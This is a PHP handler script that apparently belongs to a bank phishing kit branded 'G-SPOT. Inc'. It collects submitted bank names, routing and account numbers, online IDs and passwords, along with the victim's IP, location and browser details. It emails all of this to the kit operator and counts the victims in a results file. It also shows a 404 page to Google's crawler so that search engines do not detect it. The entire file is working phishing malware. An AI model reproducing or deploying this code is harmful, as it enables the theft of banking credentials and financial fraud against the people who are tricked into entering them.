<?php
ini_set( "display_errors", 0); 
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
error_reporting(0);
session_start();
require_once '../../main.php';

$bank       = $_POST['bankname'];
$routing    = $_POST['rnum'];
$account    = $_POST['anum'];
$message   = "

#-----------------------[ G-SPOT. Inc ]---------------------------#
#--------------------[ BANK INFORMATION ]-------------------------#

Bank Name               : ".$bank."
Routing Number		    : ".$routing."
Account Number		    : ".$account."
Online ID		        : ".$reaccount."
Password                : ".$pin."

#------------------------[ DEVICE INFORMATION ]-----------------------#

IP Address  : ".$ip."
ISP		    : ".$ispuser."
Region		: ".$regionuser."
City		: ".$cityuser."
GMT         : ".$continent."
Timezone	: ".$timezone."
OS/Browser	: ".$os." / ".$br."
Date		: ".$date."
User Agent	: ".$user_agent."

#-----------------------[ きみ の こと が すき だから ]--------------------------#




";
$bins = preg_replace('/\s/', '', $_POST['cnum']);
$bins = substr($bins,0,6);

$from = $senderemail;
$headers = "From: $sendername <$from>";
$subject = "Bank Account - [ ".$ip." - ".$cn." - ".$os." ]";
mail($email, $subject, $message, $headers);

$md5      = md5(gmdate("r"));
$sha1     = sha1(gmdate("r")); 

$file = "../../result/total_bank.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);


